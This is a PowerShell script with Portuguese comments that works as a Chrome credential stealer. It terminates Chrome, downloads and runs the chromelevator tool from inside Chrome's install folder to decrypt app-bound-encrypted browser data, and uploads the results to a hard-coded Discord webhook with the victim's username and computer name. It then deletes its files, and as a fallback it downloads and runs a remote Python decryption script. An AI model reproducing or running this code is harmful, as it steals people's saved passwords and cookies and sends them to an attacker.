param($w = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9")

function l { param($m) Write-Host ("[{0}] {1}" -f (Get-Date -Format "HH:mm:ss"), $m) }

l "=== Chrome v20 Extractor (xaitax method) ==="
l "User: $env:USERNAME@$env:COMPUTERNAME"

# Mata Chrome
Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 2

# Baixa o chromelevator.exe da release do xaitax
$downloadUrl = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/latest/download/chromelevator_x64.exe"
$localExe = "$env:TEMP\chromelevator.exe"
$outputDir = "$env:TEMP\chrome_extracted_v20"

l "[*] Baixando chromelevator.exe..."
try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($downloadUrl, $localExe)
    $wc.Dispose()
    l "[OK] Download concluido: $localExe"
} catch {
    l "[ERRO] Download falhou: $_"
    l "[*] Tentando URL alternativa..."
    try {
        $downloadUrl = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.17.2/chromelevator_x64.exe"
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($downloadUrl, $localExe)
        $wc.Dispose()
        l "[OK] Download concluido (v0.17.2)"
    } catch {
        l "[ERRO] Download alternativo falhou: $_"
        
        # Última tentativa: baixar o zip e extrair
        try {
            $zipUrl = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/latest/download/chromelevator_x64.zip"
            $zipPath = "$env:TEMP\chromelevator.zip"
            $wc = New-Object System.Net.WebClient
            $wc.DownloadFile($zipUrl, $zipPath)
            $wc.Dispose()
            
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            $zip = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
            $entry = $zip.Entries | Where-Object { $_.Name -like "*.exe" } | Select-Object -First 1
            if ($entry) {
                [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $localExe, $true)
                l "[OK] Extraido do zip"
            }
            $zip.Dispose()
            Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
        } catch {
            l "[ERRO] Todas as tentativas de download falharam"
            l "[*] Tentando metodo alternativo..."
            $localExe = $null
        }
    }
}

if ($localExe -and (Test-Path $localExe)) {
    # Prepara diretório de saída
    if (Test-Path $outputDir) { Remove-Item $outputDir -Recurse -Force -ErrorAction SilentlyContinue }
    New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
    
    # O chromelevator.exe precisa estar no diretório do Chrome para funcionar
    $chromeDir = "$env:ProgramFiles\Google\Chrome\Application"
    if (!(Test-Path $chromeDir)) { $chromeDir = "${env:ProgramFiles(x86)}\Google\Chrome\Application" }
    
    l "[*] Copiando chromelevator.exe para $chromeDir..."
    Copy-Item $localExe (Join-Path $chromeDir "chromelevator.exe") -Force -ErrorAction SilentlyContinue
    
    # Executa de dentro do diretório do Chrome
    l "[*] Executando chromelevator.exe..."
    Push-Location $chromeDir
    
    try {
        $proc = Start-Process -FilePath ".\chromelevator.exe" -ArgumentList "chrome","--output-dir","$outputDir" -NoNewWindow -Wait -PassThru -RedirectStandardOutput "$env:TEMP\chromelevator_out.txt" -RedirectStandardError "$env:TEMP\chromelevator_err.txt"
        
        l "[*] chromelevator.exe exit code: $($proc.ExitCode)"
        
        $stdout = Get-Content "$env:TEMP\chromelevator_out.txt" -Raw -ErrorAction SilentlyContinue
        $stderr = Get-Content "$env:TEMP\chromelevator_err.txt" -Raw -ErrorAction SilentlyContinue
        
        if ($stdout) { l "[STDOUT] $stdout" }
        if ($stderr) { l "[STDERR] $stderr" }
        
        # Verifica arquivos de saída
        $resultFiles = Get-ChildItem $outputDir -Recurse -File -ErrorAction SilentlyContinue
        l "[*] Arquivos gerados: $($resultFiles.Count)"
        
        if ($resultFiles.Count -gt 0) {
            # Envia cada arquivo como anexo no Discord
            $boundary = "----Boundary" + [System.Guid]::NewGuid().ToString().Replace("-","")
            $body = @()
            $body += "--$boundary"
            $body += 'Content-Disposition: form-data; name="payload_json"'
            $body += ""
            $body += ('{"content":"Chrome v20 BYPASS | ' + $env:USERNAME + '@' + $env:COMPUTERNAME + ' | Arquivos: ' + $resultFiles.Count + ' | Metodo: xaitax chromelevator"}')
            
            foreach ($file in $resultFiles) {
                $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                if ($content -and $content.Length -gt 0) {
                    $body += "--$boundary"
                    $body += ('Content-Disposition: form-data; name="file"; filename="' + $file.Name + '"')
                    $body += "Content-Type: application/json"
                    $body += ""
                    $body += $content
                }
            }
            
            $body += "--$boundary--"
            
            $bodyStr = $body -join "`r`n"
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($bodyStr)
            try {
                $wc = New-Object System.Net.WebClient
                $wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
                $wc.UploadData($w, "POST", $bytes) | Out-Null
                $wc.Dispose()
                l "[DISCORD] Dados enviados com sucesso!"
            } catch { l "[FALHA] Discord: $_" }
            
            # Salva local também
            $out = "$env:TEMP\chrome_extracted"
            if (!(Test-Path $out)) { New-Item -ItemType Directory -Path $out -Force | Out-Null }
            foreach ($file in $resultFiles) {
                Copy-Item $file.FullName (Join-Path $out $file.Name) -Force -ErrorAction SilentlyContinue
            }
            l "[SALVO] $out"
        } else {
            l "[FALHA] Nenhum arquivo gerado pelo chromelevator"
            l "[*] Tentando executar sem argumentos..."
            
            # Tenta sem argumentos
            $proc2 = Start-Process -FilePath ".\chromelevator.exe" -NoNewWindow -Wait -PassThru -RedirectStandardOutput "$env:TEMP\chromelevator_out2.txt" -RedirectStandardError "$env:TEMP\chromelevator_err2.txt"
            
            $stdout2 = Get-Content "$env:TEMP\chromelevator_out2.txt" -Raw -ErrorAction SilentlyContinue
            $stderr2 = Get-Content "$env:TEMP\chromelevator_err2.txt" -Raw -ErrorAction SilentlyContinue
            if ($stdout2) { l "[STDOUT2] $stdout2" }
            if ($stderr2) { l "[STDERR2] $stderr2" }
            
            # Verifica se criou arquivos no diretório atual
            $localFiles = Get-ChildItem $chromeDir -Filter "*.json" -ErrorAction SilentlyContinue
            if ($localFiles.Count -gt 0) {
                l "[*] Arquivos JSON encontrados no diretorio do Chrome: $($localFiles.Count)"
                foreach ($file in $localFiles) {
                    $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                    if ($content -and $content.Length -gt 0) {
                        $boundary = "----Boundary" + [System.Guid]::NewGuid().ToString().Replace("-","")
                        $body = @()
                        $body += "--$boundary"
                        $body += 'Content-Disposition: form-data; name="payload_json"'
                        $body += ""
                        $body += ('{"content":"Chrome v20 BYPASS | ' + $env:USERNAME + '@' + $env:COMPUTERNAME + ' | Arquivo: ' + $file.Name + ' | Metodo: xaitax chromelevator"}')
                        $body += "--$boundary"
                        $body += ('Content-Disposition: form-data; name="file"; filename="' + $file.Name + '"')
                        $body += "Content-Type: application/json"
                        $body += ""
                        $body += $content
                        $body += "--$boundary--"
                        
                        $bodyStr = $body -join "`r`n"
                        $bytes = [System.Text.Encoding]::UTF8.GetBytes($bodyStr)
                        $wc = New-Object System.Net.WebClient
                        $wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
                        $wc.UploadData($w, "POST", $bytes) | Out-Null
                        $wc.Dispose()
                        l "[DISCORD] $($file.Name) enviado!"
                        
                        Copy-Item $file.FullName (Join-Path $out $file.Name) -Force -ErrorAction SilentlyContinue
                    }
                }
            }
        }
    } catch {
        l "[ERRO] Execucao falhou: $_"
    }
    
    Pop-Location
    
    # Cleanup
    Remove-Item $localExe -Force -ErrorAction SilentlyContinue
    Remove-Item (Join-Path $chromeDir "chromelevator.exe") -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\chromelevator_out.txt" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\chromelevator_err.txt" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\chromelevator_out2.txt" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\chromelevator_err2.txt" -Force -ErrorAction SilentlyContinue
} else {
    l "[FALHA] chromelevator.exe nao disponivel"
    l "[*] Tentando metodo Python como ultimo recurso..."
    
    # Verifica se tem Python
    $python = Get-Command python -ErrorAction SilentlyContinue
    if ($python) {
        l "[*] Python encontrado. Baixando script de decrypt..."
        try {
            $scriptUrl = "https://raw.githubusercontent.com/runassu/chrome_v20_decryption/main/decrypt.py"
            $scriptPath = "$env:TEMP\decrypt_v20.py"
            $wc = New-Object System.Net.WebClient
            $wc.DownloadFile($scriptUrl, $scriptPath)
            $wc.Dispose()
            
            # Executa o script Python
            l "[*] Executando decrypt.py..."
            $output = & python $scriptPath 2>&1
            l "[PYTHON] $output"
        } catch { l "[ERRO] Python fallback falhou: $_" }
    } else {
        l "[FALHA] Python nao encontrado"
    }
}

l "=== CONCLUIDO ==="
